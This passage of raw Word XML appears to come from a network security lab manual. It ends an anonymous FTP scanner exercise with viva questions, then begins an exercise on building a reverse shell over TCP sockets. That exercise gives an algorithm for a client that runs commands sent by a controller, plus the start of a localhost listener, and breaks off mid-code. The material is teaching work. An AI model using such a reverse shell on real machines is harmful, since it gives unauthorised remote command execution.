            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="21297933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793347" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId47"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="4617720"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F46A7A5" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FFB3E01" w14:textId="3D682455" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64869A6E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus an anonymous ftp scanner using ftplib module was built and executed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADF67B9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1D60B9" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="079ADE0E" w14:textId="2D5E1376" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Viva Questions </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B457B41" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is FTP?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139640FC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:FTP (File Transfer Protocol) is a network protocol used to transfer files between a client and a server over the Internet or a local network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0647CB42" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is anonymous FTP login?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4D4FF0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Anonymous FTP login allows users to access an FTP server without a personal username and password, usually using "anonymous" as the username.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30005D11" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What is the purpose of an anonymous FTP scanner?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FF1578" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:An anonymous FTP scanner checks whether a server permits anonymous login access, which can help identify security risks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE74A3B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Which port is commonly used by FTP?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20175E4D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:FTP uses port 21 as its default control port for communication between the client and the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B897189" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Which Python module is used to implement an FTP scanner?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D56C23" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:The ftplib module in Python is used to connect to and interact with FTP servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A24C9C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D61EAF8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>from ftplib import FTP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507FEDF4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="14850713" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56D89CE1" w14:textId="2726BF48" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ex.No:8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F074B83" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="001F0ABB">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>REVERSE SHELL USING TCP SOCKETS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E8D062" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8F19BE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To develop a program to reverse shell using TCP Sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FDB5535" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C609B29" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Reverse Shell:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612D439E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>A reverse shell is a TCP connection where a target machine connects back to a controller, allowing remote command execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2087E86E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>TCP Sockets:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18EC8A3F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>TCP sockets are endpoints for a reliable, connection-based communication channel between two machines over the Internet or a network. They ensure ordered, error-checked data delivery.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458054E6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6745D65E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3DB3AE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Create a socket and bind it to host and port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43230AC1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Start listening for incoming client connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3260615C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Accept a connection when a client connects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3683D8B2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Send user-entered commands to the connected client.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1CE912" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Receive and display the client’s output; close on `quit`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F265186" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C12506F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Create a socket and connect to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A46222" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Wait to receive a command from the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E55617C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. If the command is `cd`, change the directory; if `quit`, close connection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C898F2F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Execute other commands using subprocess.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444706AB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Send the command output and current directory back to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D7AD0D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5B79D4" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3416D13F" w14:textId="349A4BD2" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A662BBC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA8C0EF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FE7169" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5181DD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>host = '127.0.0.1'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEFE862" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>port = 9999</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B2BD10" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def create_server_socket():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0BD0E6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6359E956" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    server.bind((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5963A9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    server.listen(5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F50EE95" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[+] Listening on {host}:{port}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDDC011" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1E226A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def handle_client(conn, addr):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1B3F56" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
